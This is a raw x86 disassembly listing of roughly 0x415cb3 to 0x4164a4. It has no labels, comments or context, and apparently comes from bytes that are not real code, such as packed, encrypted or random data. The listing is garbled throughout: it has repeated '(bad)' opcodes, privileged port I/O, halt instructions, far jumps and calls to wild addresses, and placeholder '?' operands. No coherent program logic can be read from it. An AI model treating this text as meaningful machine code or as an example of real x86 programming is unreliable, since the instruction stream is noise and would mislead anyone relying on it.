  415cb3:	push   DWORD PTR [edi+0x77bf8dc8]
  415cb9:	sbb    al,0xa8
  415cbb:	and    DWORD PTR [edx],ebp
  415cbd:	mov    ch,0x9b
  415cbf:	mov    ah,BYTE PTR [esi]
  415cc1:	adc    edx,edx
  415cc3:	pop    es
  415cc4:	cmp    al,0x1c
  415cc6:	js     0x415c88
  415cc8:	not    DWORD PTR [ebx-0x1d]
  415ccb:	mov    ebx,0xa6994ab8
  415cd0:	pop    edi
  415cd1:	sub    esp,edx
  415cd3:	adc    al,0xe2
  415cd5:	out    0x3b,eax
  415cd7:	(bad)  
  415cd8:	rcr    ecx,0x73
  415cdb:	push   0x12
  415cdd:	xchg   ebp,eax
  415cde:	add    ebx,ecx
  415ce0:	sbb    ebp,ecx
  415ce2:	mov    ebx,0xda09c89
  415ce7:	outs   dx,BYTE PTR ds:[esi]
  415ce8:	call   0x7c7b6d2b
  415ced:	jmp    0x415d2d
  415cef:	push   ss
  415cf0:	imul   edi,DWORD PTR [ecx+0x6e],0x697dc856
  415cf7:	mov    WORD PTR [ebx+0x54],gs
  415cfa:	je     0x415d27
  415cfc:	call   FWORD PTR ds:0x2fe1d46a
  415d02:	jecxz  0x415d5d
  415d04:	inc    esp
  415d05:	mov    ecx,0x34ba45fc
  415d0a:	xlat   BYTE PTR ds:[ebx]
  415d0b:	push   ecx
  415d0c:	push   esp
  415d0d:	bswap  edx
  415d0f:	mov    ds:0x8fd3090,eax
  415d14:	pushf  
  415d15:	std    
  415d16:	mov    dh,0x57
  415d18:	and    eax,DWORD PTR [edi]
  415d1a:	adc    DWORD PTR [ecx-0x4578ab3c],0xef7707a6
  415d24:	out    dx,al
  415d25:	sub    DWORD PTR [ebp-0x4ce3ba29],ebp
  415d2b:	xlat   BYTE PTR ds:[ebx]
  415d2c:	sbb    bl,dh
  415d2e:	sub    eax,0xf7c42f1d
  415d33:	mov    al,0x62
  415d35:	test   DWORD PTR [edi-0x35499570],ebp
  415d3b:	retf   
  415d3c:	push   ecx
  415d3d:	cs xchg esi,eax
  415d3f:	call   0x9dd7177e
  415d44:	js     0x415d97
  415d46:	les    edx,FWORD PTR [eax-0xea39347]
  415d4c:	mov    bl,0x16
  415d4e:	adc    eax,0x6937b159
  415d53:	into   
  415d54:	adc    ecx,DWORD PTR [edi+0x6a]
  415d57:	stos   DWORD PTR es:[edi],eax
  415d58:	rcl    eax,cl
  415d5a:	inc    ebp
  415d5b:	mov    ecx,DWORD PTR [eax+0x39]
  415d5e:	mov    ds:0x2ae29254,al
  415d63:	pop    esi
  415d64:	jmp    0xef32ae1e
  415d69:	call   0x42ed:0x5af5bd4e
  415d70:	pop    es
  415d71:	xchg   esp,eax
  415d72:	dec    edx
  415d73:	test   BYTE PTR [ebx+ecx*1+0x3a],dh
  415d77:	xor    bl,ah
  415d79:	loope  0x415df3
  415d7b:	push   ecx
  415d7c:	in     al,0x9d
  415d7e:	pop    esp
  415d7f:	(bad)  
  415d80:	out    dx,eax
  415d81:	mov    al,fs:0x6aec3e14
  415d87:	jecxz  0x415d5d
  415d89:	xchg   edx,eax
  415d8a:	sar    DWORD PTR [edx],1
  415d8c:	add    eax,0x6352aae6
  415d91:	pusha  
  415d92:	cdq    
  415d93:	sub    edi,DWORD PTR [ecx+0x49]
  415d96:	dec    esi
  415d97:	repnz lds edi,FWORD PTR [eax*8+0x7ec298d4]
  415d9f:	adc    al,0x24
  415da1:	xchg   ebp,eax
  415da2:	add    esp,DWORD PTR [ebx+eax*8]
  415da5:	xor    dl,BYTE PTR [ecx]
  415da7:	fdiv   st(6),st
  415da9:	loopne 0x415d9f
  415dab:	sbb    DWORD PTR [esp+esi*2+0x58],edi
  415daf:	pusha  
  415db0:	call   0xb845a8bb
  415db5:	or     ecx,DWORD PTR [esi-0x61ccb659]
  415dbb:	adc    esp,DWORD PTR [edi+0x27]
  415dbe:	sti    
  415dbf:	sahf   
  415dc0:	mov    eax,0x12a974bf
  415dc5:	xchg   ebx,eax
  415dc6:	sub    BYTE PTR [edi-0x1d701376],al
  415dcc:	mov    BYTE PTR [ebp+0x14c9ba5e],cl
  415dd2:	in     eax,dx
  415dd3:	push   ds
  415dd4:	scas   eax,DWORD PTR es:[edi]
  415dd5:	addr16 xor eax,0x3e1db19e
  415ddb:	add    al,0x8c
  415ddd:	jp     0x415dec
  415ddf:	and    ah,BYTE PTR ds:0x50ed2da4
  415de5:	retf   
  415de6:	xor    al,0xd8
  415de8:	or     ebx,DWORD PTR [edx+0x1a]
  415deb:	aad    0xc4
  415ded:	clc    
  415dee:	fcmove st,st(1)
  415df0:	xor    BYTE PTR [edx-0x46],bh
  415df3:	cwde   
  415df4:	xor    BYTE PTR [eax+0x32bc09e2],cl
  415dfa:	mov    cl,0xce
  415dfc:	pop    ss
  415dfd:	cld    
  415dfe:	or     edx,esi
  415e00:	in     eax,0xd1
  415e02:	add    al,0x3b
  415e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e05:	retf   
  415e06:	arpl   WORD PTR [edi-0x7080ce72],bp
  415e0c:	and    eax,0x334ec81e
  415e11:	fbld   TBYTE PTR [ecx+0x55bef1b5]
  415e17:	stc    
  415e18:	push   ss
  415e19:	and    eax,0xc9c1745f
  415e1e:	mov    eax,0x7779b11d
  415e23:	jmp    0x415db9
  415e25:	add    eax,0x3e70b49d
  415e2a:	in     al,dx
  415e2b:	fstp   DWORD PTR [edi-0x24]
  415e2e:	in     al,0x55
  415e30:	into   
  415e31:	inc    esi
  415e32:	dec    edx
  415e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e34:	and    BYTE PTR [ecx+ebx*1-0x3c],bl
  415e38:	aad    0xe0
  415e3a:	cdq    
  415e3b:	xchg   ebx,eax
  415e3c:	push   edi
  415e3d:	retf   0x6628
  415e40:	push   edi
  415e41:	daa    
  415e42:	pop    esp
  415e43:	mov    edx,0x5e4bff33
  415e48:	xchg   BYTE PTR [esi+0x3dbf98f2],dl
  415e4e:	pop    ss
  415e4f:	pop    ss
  415e50:	out    0x11,al
  415e52:	dec    ecx
  415e53:	mov    esi,0x60ca67fb
  415e58:	and    ebx,ebp
  415e5a:	lods   eax,DWORD PTR ds:[esi]
  415e5b:	stc    
  415e5c:	mov    ebx,0x5b83e69b
  415e61:	gs out 0xe4,eax
  415e64:	dec    ecx
  415e65:	leave  
  415e66:	mov    dl,0xf5
  415e68:	popa   
  415e69:	xor    ch,BYTE PTR [ecx+0x38]
  415e6c:	or     ch,bh
  415e6e:	inc    ebx
  415e6f:	cmp    esp,DWORD PTR [eax+0x6dc61647]
  415e75:	stc    
  415e76:	mov    ch,0x74
  415e78:	in     al,0x75
  415e7a:	mul    BYTE PTR ds:0x9801eb98
  415e80:	xor    cl,BYTE PTR [edx]
  415e82:	mov    ?,WORD PTR [esi+eiz*1+0x58]
  415e86:	mov    ds:0x988fde34,al
  415e8b:	enter  0xa163,0x5b
  415e8f:	popa   
  415e90:	or     ecx,DWORD PTR [ecx]
  415e92:	fistp  DWORD PTR [ecx]
  415e94:	retf   
  415e95:	mov    esi,0x9d697856
  415e9a:	add    eax,0x515640d8
  415e9f:	mov    ecx,DWORD PTR [ebx]
  415ea1:	mov    eax,ds:0xdcb9efb4
  415ea6:	ins    BYTE PTR es:[edi],dx
  415ea7:	and    ah,BYTE PTR [ebx]
  415ea9:	pop    ebp
  415eaa:	dec    ebp
  415eab:	(bad)  
  415eac:	xchg   esp,eax
  415ead:	xchg   ecx,eax
  415eae:	sub    ch,al
  415eb0:	icebp  
  415eb1:	mov    bh,0x84
  415eb3:	adc    DWORD PTR [esi+ecx*1+0x69],eax
  415eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eb8:	aaa    
  415eb9:	jecxz  0x415f19
  415ebb:	and    eax,0x3dfea828
  415ec0:	push   es
  415ec1:	aam    0xea
  415ec3:	jp     0x415eb3
  415ec5:	fnstenv [ebx]
  415ec7:	dec    edx
  415ec8:	call   FWORD PTR [esi]
  415eca:	test   DWORD PTR [ebx],ebp
  415ecc:	mov    ah,0xcb
  415ece:	pop    eax
  415ecf:	push   eax
  415ed0:	aaa    
  415ed1:	hlt    
  415ed2:	es and ebp,eax
  415ed5:	mov    ch,0xf5
  415ed7:	and    esp,DWORD PTR [ebx-0x3c]
  415eda:	arpl   WORD PTR [edi],sp
  415edc:	sbb    bh,al
  415ede:	mov    eax,0x6be17f20
  415ee3:	cmp    eax,0xd79d5b1a
  415ee8:	repnz loopne 0x415ec5
  415eeb:	aas    
  415eec:	dec    ebx
  415eed:	adc    dh,BYTE PTR ds:[edi]
  415ef0:	(bad)
  415ef5:	inc    esi
  415ef6:	fisttp WORD PTR [ecx]
  415ef8:	jmp    0xcc803d08
  415efd:	xchg   BYTE PTR [ecx+ebp*8+0x5a],bh
  415f01:	jp     0x415f0e
  415f03:	in     al,dx
  415f04:	add    DWORD PTR [edx+0x3e],0xb07b849b
  415f0b:	pop    esp
  415f0c:	pushf  
  415f0d:	test   al,0xe
  415f0f:	push   ds
  415f10:	pop    edx
  415f11:	leave  
  415f12:	test   BYTE PTR [edi+eax*2],bl
  415f15:	psrlq  mm7,QWORD PTR ds:0xc1e0ace4
  415f1c:	shl    esi,1
  415f1e:	in     al,0x8
  415f20:	ja     0x415f50
  415f22:	in     eax,dx
  415f23:	mov    WORD PTR [esi+0x2da79fe6],es
  415f29:	mov    ebp,0xdd005678
  415f2e:	(bad)  
  415f2f:	sti    
  415f30:	jp     0x415fae
  415f32:	je     0x415f8a
  415f34:	mov    ebp,0x41f67c63
  415f39:	fmul   QWORD PTR [eax]
  415f3b:	ins    DWORD PTR es:[edi],dx
  415f3c:	test   al,0x4a
  415f3e:	ja     0x415f2c
  415f40:	pop    esp
  415f41:	scas   al,BYTE PTR es:[edi]
  415f42:	inc    ecx
  415f43:	test   BYTE PTR [ebp-0x23a0e69b],dh
  415f49:	jns    0x415f2e
  415f4b:	push   esi
  415f4c:	cmp    BYTE PTR [ebx-0x2a2e09b3],0x28
  415f53:	sub    ah,BYTE PTR [ebp+0x3a4da1ed]
  415f59:	les    ecx,FWORD PTR [esi-0x127baf8]
  415f5f:	pop    esp
  415f60:	fst    DWORD PTR [edi]
  415f62:	or     eax,0x97a3c399
  415f67:	arpl   dx,cx
  415f69:	sub    DWORD PTR [esi-0x79a8257a],0x68
  415f70:	push   esi
  415f71:	dec    ebp
  415f72:	inc    ecx
  415f73:	add    al,0xd9
  415f75:	(bad)  
  415f76:	scas   al,BYTE PTR es:[edi]
  415f77:	or     al,BYTE PTR [edx+0x55]
  415f7a:	adc    dh,ch
  415f7c:	jbe    0x415f58
  415f7e:	mov    eax,0xfcc66199
  415f83:	out    0xf5,al
  415f85:	outs   dx,BYTE PTR ds:[esi]
  415f86:	idiv   BYTE PTR [ebx]
  415f88:	jmp    0x67f701f7
  415f8d:	loopne 0x415ffe
  415f8f:	inc    ebx
  415f90:	jbe    0x415fbf
  415f92:	mov    dh,0xa9
  415f94:	loop   0x415fc5
  415f96:	xchg   BYTE PTR [eax+0x49],bl
  415f99:	nop
  415f9a:	inc    BYTE PTR ss:[ebx+0x4a]
  415f9e:	dec    eax
  415f9f:	xor    BYTE PTR [edi],dh
  415fa1:	out    0xc3,al
  415fa3:	push   esp
  415fa4:	jecxz  0x415f8c
  415fa6:	push   0x82de2341
  415fab:	lods   al,BYTE PTR ds:[esi]
  415fac:	outs   dx,DWORD PTR ds:[esi]
  415fad:	sub    bh,BYTE PTR [ebx-0x40820544]
  415fb3:	xchg   ah,dh
  415fb5:	mov    edi,0x21158d33
  415fba:	adc    cl,BYTE PTR [ecx-0x4ebb8201]
  415fc0:	pop    eax
  415fc1:	repz push esi
  415fc3:	stos   DWORD PTR es:[edi],eax
  415fc4:	pop    esp
  415fc5:	stos   BYTE PTR es:[edi],al
  415fc6:	pop    ebx
  415fc7:	sti    
  415fc8:	cmp    eax,0x8f6dcd26
  415fcd:	pusha  
  415fce:	mov    edx,0xdcf32438
  415fd3:	push   ds
  415fd4:	mov    WORD PTR [ebx-0x40],ds
  415fd7:	fisubr WORD PTR [edi+eiz*1-0x55d388ed]
  415fde:	adc    BYTE PTR [edi],bh
  415fe0:	xor    al,0x7
  415fe2:	mov    DWORD PTR [ebx+eax*4-0x67843da1],0x412ba35e
  415fed:	xlat   BYTE PTR ds:[ebx]
  415fee:	cwde   
  415fef:	es dec edi
  415ff1:	icebp  
  415ff2:	mov    ds:0xb6ab63e3,eax
  415ff7:	cmp    al,0x63
  415ff9:	jbe    0x415f87
  415ffb:	jp     0x415fbf
  415ffd:	mov    BYTE PTR [ebp+ebp*4+0x1e],ch
  416001:	sbb    BYTE PTR [eax-0x58],cl
  416004:	adc    edi,DWORD PTR [eax+0x15]
  416007:	mul    esi
  416009:	adc    al,0xf4
  41600b:	push   eax
  41600c:	add    eax,0xcf82042d
  416011:	cli    
  416012:	cmc    
  416013:	test   al,0x73
  416015:	mov    edi,es
  416017:	adc    al,0x76
  416019:	ror    DWORD PTR [ecx-0x67],0x9e
  41601d:	xchg   edx,eax
  41601e:	cmp    esp,DWORD PTR [ebp+0x28]
  416021:	les    ebp,FWORD PTR [esp+ebx*1+0x16]
  416025:	dec    esi
  416026:	xchg   esi,eax
  416027:	sti    
  416028:	das    
  416029:	cmp    eax,0xfed250b0
  41602e:	nop
  41602f:	push   edx
  416030:	rcl    ah,1
  416032:	dec    ebp
  416033:	push   eax
  416034:	cwde   
  416035:	rcl    BYTE PTR [ebp+0x45],1
  416038:	jae    0x416030
  41603a:	pop    es
  41603b:	adc    edi,DWORD PTR [edi-0x14]
  41603e:	mov    al,0xeb
  416040:	xor    eax,0x5901100d
  416045:	mov    BYTE PTR [ebp+0x5545ec68],ch
  41604b:	mov    esi,0xd6afffd1
  416050:	out    0x5,al
  416052:	iret   
  416053:	or     al,0x31
  416055:	mov    WORD PTR [ecx+0x5c],?
  416058:	jmp    0xe2f1a8db
  41605d:	add    ah,bl
  41605f:	mov    esi,0xda4bb811
  416064:	test   al,0xf8
  416066:	xor    eax,0xfb28dd13
  41606b:	mov    dl,BYTE PTR [edi]
  41606d:	sub    dh,bh
  41606f:	add    al,0xad
  416071:	or     eax,0x4fda5e36
  416076:	adc    BYTE PTR [ebp-0x5d],ah
  416079:	mov    ds:0x9f7772be,eax
  41607e:	mov    ds:0xaeec2fc8,eax
  416083:	xchg   ebp,eax
  416084:	ins    DWORD PTR es:[edi],dx
  416085:	lds    edx,FWORD PTR [ecx-0xfb7370]
  41608b:	lea    esp,[ebp+0x383a13d1]
  416091:	imul   edx,DWORD PTR [ebp-0x714797a0],0x9dfb103a
  41609b:	nop
  41609c:	fisubr DWORD PTR [edx+0xd07398c]
  4160a2:	fnstcw WORD PTR [edi+0x416bf281]
  4160a8:	dec    eax
  4160a9:	add    esp,DWORD PTR [ebx+0x4ae82e51]
  4160af:	xchg   ebp,eax
  4160b0:	shl    BYTE PTR [edx+0xe],0xe9
  4160b4:	stos   BYTE PTR es:[edi],al
  4160b5:	mov    bl,0x5c
  4160b7:	add    esp,DWORD PTR [ebx]
  4160b9:	test   DWORD PTR [edi+ebx*8+0x53],ebx
  4160bd:	jl     0x4160e9
  4160bf:	std    
  4160c0:	or     DWORD PTR [edx-0x37],esp
  4160c3:	scas   eax,DWORD PTR es:[edi]
  4160c4:	jp     0x416090
  4160c6:	mov    ch,0x7f
  4160c8:	cmc    
  4160c9:	call   0x9c99:0x337eb36b
  4160d0:	loopne 0x41612f
  4160d2:	cs jl  0x416143
  4160d5:	shl    esi,0xd3
  4160d8:	cmc    
  4160d9:	jns    0x416088
  4160db:	ror    DWORD PTR [edi],cl
  4160dd:	xchg   ebx,eax
  4160de:	mov    ch,0x47
  4160e0:	ins    BYTE PTR es:[edi],dx
  4160e1:	test   eax,0xe12e0665
  4160e6:	out    0xca,eax
  4160e8:	adc    al,0xd4
  4160ea:	or     al,0x5d
  4160ec:	sbb    ebp,DWORD PTR [edx]
  4160ee:	out    dx,eax
  4160ef:	retf   
  4160f0:	ja     0x416084
  4160f2:	mov    ah,BYTE PTR [edi-0x2]
  4160f5:	add    al,0x5d
  4160f7:	rcl    DWORD PTR [ebx-0xb863c69],cl
  4160fd:	mov    edx,0xa069cef8
  416102:	pushf  
  416103:	out    dx,al
  416104:	dec    esi
  416105:	ss aam 0x90
  416108:	or     ebp,edi
  41610a:	dec    eax
  41610c:	jns    0x416184
  41610e:	or     al,0xc3
  416110:	sub    al,BYTE PTR [eax]
  416112:	sbb    al,0x4a
  416114:	xor    al,BYTE PTR [edi-0x6a]
  416117:	pop    ss
  416118:	inc    ecx
  416119:	stos   BYTE PTR es:[edi],al
  41611a:	call   0x201f:0x817779f2
  416121:	iret   
  416122:	je     0x416139
  416124:	mov    BYTE PTR [esi-0x17683226],dl
  41612a:	jmp    0x59cd:0x8a721d5
  416131:	bound  edx,QWORD PTR [edi-0x3e]
  416134:	push   ss
  416135:	in     al,dx
  416136:	mov    BYTE PTR [edi-0x3e],cl
  416139:	(bad)  
  41613a:	in     al,dx
  41613b:	call   0x25a6bfc1
  416140:	test   BYTE PTR [edi+ebx*2+0x3685bf34],ah
  416147:	mov    dh,0x0
  416149:	pop    esp
  41614a:	sar    bh,cl
  41614c:	(bad)  
  41614d:	jl     0x416161
  41614f:	jg     0x4161cf
  416151:	xchg   ebp,eax
  416152:	out    0x98,eax
  416154:	mov    ah,BYTE PTR [eax+0x4e924e8e]
  41615a:	out    dx,al
  41615b:	jp     0x416151
  41615d:	pop    edx
  41615e:	cmp    DWORD PTR [ecx-0x39],0xffffffdd
  416162:	inc    ecx
  416163:	ja     0x4161d8
  416165:	pop    ebx
  416166:	ins    BYTE PTR es:[edi],dx
  416167:	pop    ebp
  416168:	add    ch,dh
  41616a:	shr    BYTE PTR [esi],cl
  41616c:	(bad)  
  41616d:	stc    
  41616e:	sub    ch,BYTE PTR [eax]
  416170:	ror    BYTE PTR [edi+0x69528b94],1
  416176:	inc    ebp
  416177:	shr    BYTE PTR [esi-0x4b93fae0],1
  41617d:	inc    esp
  41617e:	arpl   WORD PTR [ebp-0x131387f3],di
  416184:	add    BYTE PTR [edi-0x6fff2b16],0xf9
  41618b:	jae    0x4161e6
  41618d:	and    bh,bh
  41618f:	pop    ebx
  416190:	sti    
  416191:	lods   eax,DWORD PTR ds:[esi]
  416192:	push   esp
  416193:	dec    esi
  416194:	jno    0x4161a6
  416196:	cmp    DWORD PTR [ebx],ecx
  416198:	add    al,ah
  41619a:	sub    eax,0xd92fecae
  41619f:	inc    edi
  4161a0:	(bad)  
  4161a1:	daa    
  4161a2:	mov    eax,0xdf981558
  4161a7:	out    0x48,al
  4161a9:	js     0x416174
  4161ab:	mov    ecx,ecx
  4161ad:	lahf   
  4161ae:	sti    
  4161af:	xchg   esi,eax
  4161b0:	and    DWORD PTR [edx-0x31],esi
  4161b3:	mov    eax,ds:0xb03dd00f
  4161b8:	and    eax,0x25ce2bc7
  4161bd:	mov    al,0x84
  4161bf:	adc    BYTE PTR [eax-0x80],bh
  4161c2:	out    dx,al
  4161c3:	cmp    eax,0xf13fd08d
  4161c8:	push   ecx
  4161c9:	add    DWORD PTR [esi],eax
  4161cb:	daa    
  4161cc:	and    BYTE PTR [edi],0xb0
  4161cf:	aad    0x99
  4161d1:	ret    
  4161d2:	sbb    DWORD PTR [eax+0x1271740e],esp
  4161d8:	outs   dx,BYTE PTR ds:[esi]
  4161d9:	jno    0x416234
  4161db:	sub    edx,ebp
  4161dd:	jnp    0x4161a7
  4161df:	adc    ch,al
  4161e1:	push   ss
  4161e2:	and    BYTE PTR [esi-0x546e0c64],0x41
  4161e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ea:	cs push edx
  4161ec:	aas    
  4161ed:	jmp    0x70f4:0xf0f63831
  4161f4:	repz fcos 
  4161f7:	(bad)  
  4161f8:	loop   0x4161ab
  4161fa:	jne    0x416231
  4161fc:	sbb    al,0xbc
  4161fe:	or     eax,0x559e6f3
  416203:	pop    ds
  416204:	cmp    dh,BYTE PTR [ecx]
  416206:	and    edx,0xffffffdb
  416209:	push   edx
  41620a:	mov    ds:0x6bfcdd64,eax
  41620f:	adc    dh,BYTE PTR [esi]
  416211:	dec    ebp
  416212:	(bad)  
  416213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416214:	and    edx,ecx
  416216:	icebp  
  416217:	push   eax
  416218:	xchg   esp,eax
  416219:	repz repz fisttp WORD PTR es:[eax+0x2bca3033]
  416222:	push   ebp
  416223:	dec    ebp
  416224:	cld    
  416225:	into   
  416226:	les    ebp,FWORD PTR [eax-0x865b0db]
  41622c:	pop    esi
  41622d:	pop    ss
  41622e:	shl    BYTE PTR [eax-0x2e6516b5],0x16
  416235:	add    bh,BYTE PTR [esi-0x24df1522]
  41623b:	lods   al,BYTE PTR ds:[esi]
  41623c:	(bad)  
  41623d:	aam    0xf
  41623f:	jmp    0x2a04eb48
  416244:	pop    ss
  416245:	leave  
  416246:	jecxz  0x4161e0
  416248:	pop    eax
  416249:	inc    ebp
  41624a:	js     0x4161f9
  41624c:	inc    ecx
  41624d:	je     0x4161ec
  41624f:	ins    DWORD PTR es:[edi],dx
  416250:	(bad)  
  416251:	mov    ebx,0x2a671eb6
  416256:	mul    DWORD PTR [eax-0x773a7c94]
  41625c:	pop    edx
  41625d:	lock adc BYTE PTR [ecx-0x29f92c30],ah
  416264:	sahf   
  416265:	adc    edi,DWORD PTR ds:0x45dacff
  41626b:	repz test eax,0x53333695
  416271:	inc    eax
  416272:	shr    BYTE PTR [esi],1
  416274:	sar    BYTE PTR ds:0x92236fc4,cl
  41627a:	jmp    0x41621c
  41627c:	bound  ebx,QWORD PTR [ebx]
  41627e:	fnstsw WORD PTR ds:0xe7023a76
  416284:	add    dh,BYTE PTR [ebp+0x6c]
  416287:	iret   
  416288:	sbb    eax,0x7fea6667
  41628d:	stc    
  41628e:	ins    DWORD PTR es:[edi],dx
  41628f:	lahf   
  416290:	push   0xffffffa0
  416292:	mov    ebp,0xfb47a065
  416297:	in     eax,0xc9
  416299:	adc    al,cl
  41629b:	mov    ah,0x11
  41629d:	jb     0x4162f6
  41629f:	aad    0x4d
  4162a1:	cmp    ebp,0xfa08de0a
  4162a7:	inc    ebp
  4162a8:	pop    esp
  4162a9:	lods   eax,DWORD PTR ds:[esi]
  4162aa:	test   eax,0xd492c334
  4162af:	cmp    al,0xe8
  4162b1:	out    0xb5,eax
  4162b3:	in     eax,0x76
  4162b5:	stos   DWORD PTR es:[edi],eax
  4162b6:	jb     0x41627a
  4162b8:	cmp    DWORD PTR [esi-0x61ba8e5b],ebx
  4162be:	int    0x3c
  4162c0:	loop   0x4162df
  4162c2:	retf   0xb6af
  4162c5:	cli    
  4162c6:	or     esp,edi
  4162c8:	xchg   ah,ch
  4162ca:	mov    al,ds:0x89c8534d
  4162cf:	add    al,dl
  4162d1:	xchg   DWORD PTR [edi],eax
  4162d3:	jno    0x4162f7
  4162d5:	aad    0x6b
  4162d7:	push   ecx
  4162d8:	sbb    al,0xb9
  4162da:	rcl    BYTE PTR [edi-0x7ddaf95b],0xf2
  4162e1:	xchg   edx,eax
  4162e2:	and    DWORD PTR [ebx-0x7e0a9b77],edx
  4162e8:	pop    esi
  4162e9:	cld    
  4162ea:	aam    0x92
  4162ec:	in     eax,dx
  4162ed:	pop    ebx
  4162ee:	fwait
  4162ef:	repnz aam 0x17
  4162f2:	ss mov ebx,0x789f210b
  4162f8:	retf   0xa2de
  4162fb:	jns    0x41629b
  4162fd:	dec    eax
  4162fe:	sub    ebx,DWORD PTR [ebx]
  416300:	in     al,dx
  416301:	xchg   edi,eax
  416302:	pop    edi
  416303:	pop    esp
  416304:	cmp    ecx,edi
  416306:	retf   0xcb07
  416309:	push   cs
  41630a:	in     al,dx
  41630b:	sbb    ch,BYTE PTR [edx+0x3eb5c4bc]
  416311:	dec    ebp
  416312:	mov    esi,0xbf29a54b
  416317:	mov    dl,0xb0
  416319:	xor    al,0x3e
  41631b:	shl    BYTE PTR [eax+0x560633e3],0x10
  416322:	ffreep st(3)
  416324:	sub    edx,esi
  416326:	not    esi
  416328:	push   edi
  416329:	pop    edi
  41632a:	in     al,0x5
  41632c:	and    dl,bh
  41632e:	ja     0x41633a
  416330:	into   
  416331:	inc    ecx
  416332:	xchg   esp,eax
  416333:	xchg   BYTE PTR [ebx],ah
  416335:	mov    esp,0xc2237c6b
  41633a:	in     al,0xeb
  41633c:	fbld   TBYTE PTR [ecx+0x31844599]
  416342:	jle    0x4162eb
  416344:	mov    ds:0xee95dea8,al
  416349:	adc    DWORD PTR [ecx],esp
  41634b:	mov    al,0xf1
  41634d:	mov    eax,0x908e0ce7
  416352:	and    BYTE PTR [edi-0x55],bl
  416355:	add    dh,BYTE PTR [edi-0x7738f8bd]
  41635b:	mov    eax,0x1af832f6
  416360:	aad    0x87
  416362:	pop    ebp
  416363:	or     cl,dh
  416365:	das    
  416366:	push   0xffffffd6
  416368:	push   esp
  416369:	push   eax
  41636a:	mov    ebx,0x4fc84423
  41636f:	aad    0x22
  416371:	mov    ebx,0x77bf0ca6
  416376:	mov    bh,0xe7
  416378:	push   ss
  416379:	push   cs
  41637a:	mov    bh,0x53
  41637c:	mov    ecx,0xebc8e545
  416381:	mov    ds:0x12da81f4,al
  416386:	adc    al,0x2e
  416388:	ret    0xa197
  41638b:	sbb    eax,0xb5d1351a
  416390:	in     al,0x6
  416392:	sub    al,0xd9
  416394:	inc    esi
  416395:	fcom   QWORD PTR [ecx]
  416397:	mov    ds:0xc7643023,eax
  41639c:	sub    dh,cl
  41639e:	inc    edx
  41639f:	loope  0x416407
  4163a1:	pop    eax
  4163a2:	loope  0x41632b
  4163a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163a5:	xlat   BYTE PTR ds:[ebx]
  4163a6:	and    ah,ah
  4163a8:	out    dx,eax
  4163a9:	(bad)  
  4163aa:	fs pop ebx
  4163ac:	jmp    0xb7e0:0x7a6e2051
  4163b3:	adc    BYTE PTR [edx-0xd2b6a11],bl
  4163b9:	dec    esp
  4163ba:	pop    ebp
  4163bb:	fisub  DWORD PTR [ecx+0x1c]
  4163be:	push   ebx
  4163bf:	and    al,0x55
  4163c1:	outs   dx,DWORD PTR ds:[esi]
  4163c2:	lods   eax,DWORD PTR ds:[esi]
  4163c3:	syscall 
  4163c5:	call   0x437c:0x387b8d1d
  4163cc:	ja     0x416427
  4163ce:	imul   eax,DWORD PTR [edx+0x2f2f0112],0xfffffff6
  4163d5:	jae    0x416370
  4163d7:	pop    ds
  4163d8:	aaa    
  4163d9:	inc    ebx
  4163da:	cmc    
  4163db:	jo     0x416387
  4163dd:	ja     0x4163cb
  4163df:	mov    ebx,0xa5007970
  4163e4:	ret    0x2963
  4163e7:	icebp  
  4163e8:	dec    ecx
  4163e9:	jae    0x4163cc
  4163eb:	inc    edx
  4163ec:	gs call 0x7027dad6
  4163f2:	js     0x4163c2
  4163f4:	mov    esi,0x123b0c76
  4163f9:	popw   ss
  4163fb:	pop    eax
  4163fc:	lods   eax,DWORD PTR ds:[esi]
  4163fd:	xor    DWORD PTR [ebx+ecx*1],0x191470fa
  416404:	popa   
  416405:	loopne 0x41643e
  416407:	push   edx
  416408:	cli    
  416409:	mov    esp,0x945dce54
  41640e:	loop   0x41640d
  416410:	jo     0x4163d0
  416412:	mov    ds,eax
  416414:	aas    
  416415:	lahf   
  416416:	pushf  
  416417:	pop    es
  416418:	fs xchg DWORD PTR ss:[eax+edi*1-0x17],eax
  41641e:	push   0xe2aa2947
  416423:	loope  0x4163ea
  416425:	and    BYTE PTR [ebp+0x55],bh
  416428:	scas   eax,DWORD PTR es:[edi]
  416429:	std    
  41642a:	lds    edi,FWORD PTR [ecx+0x76c4b00]
  416430:	push   ss
  416431:	sub    ebx,DWORD PTR [edx-0x3227c80f]
  416437:	inc    eax
  416438:	or     edi,eax
  41643a:	xchg   edx,eax
  41643b:	sub    DWORD PTR [ecx],esp
  41643d:	lods   eax,DWORD PTR ds:[esi]
  41643e:	mov    cl,BYTE PTR [ebx-0x2d]
  416441:	cli    
  416442:	inc    ebp
  416443:	in     al,dx
  416444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416445:	push   edx
  416446:	iret   
  416447:	stos   DWORD PTR es:[edi],eax
  416448:	and    edx,DWORD PTR [esp-0x78]
  41644c:	loope  0x416460
  41644e:	es lahf 
  416450:	je     0x416421
  416452:	and    DWORD PTR [ebx+esi*8],edi
  416455:	cmp    edx,DWORD PTR [ebx-0x25f804bd]
  41645b:	add    bl,BYTE PTR [esi+0x37]
  41645e:	jg     0x4164d1
  416460:	jns    0x416421
  416462:	iret   
  416463:	aad    0xa5
  416465:	aad    0xe
  416467:	int3   
  416468:	les    ebx,FWORD PTR [ebp+0x6b]
  41646b:	push   ss
  41646c:	inc    edx
  41646d:	fs sub al,0x16
  416470:	retf   0xe550
  416473:	fcomp  QWORD PTR [edx]
  416475:	jae    0x416451
  416477:	jmp    0x4164d6
  416479:	or     eax,0x3693ae05
  41647e:	mov    ds:0xcdf84996,al
  416483:	sbb    BYTE PTR [ebp+0x6abd944f],0xd3
  41648a:	cs mov cl,0x49
  41648d:	ds jle 0x4164c7
  416490:	lods   eax,DWORD PTR ds:[esi]
  416491:	imul   eax,DWORD PTR [eax],0x30ab017d
  416497:	fs mov cl,0xde
  41649a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649b:	pusha  
  41649c:	xor    BYTE PTR ss:[edx],al
  41649f:	aas    
  4164a0:	sub    cl,BYTE PTR [ebx-0x2e]
  4164a3:	push   ebx
  4164a4:	out    0x82,eax
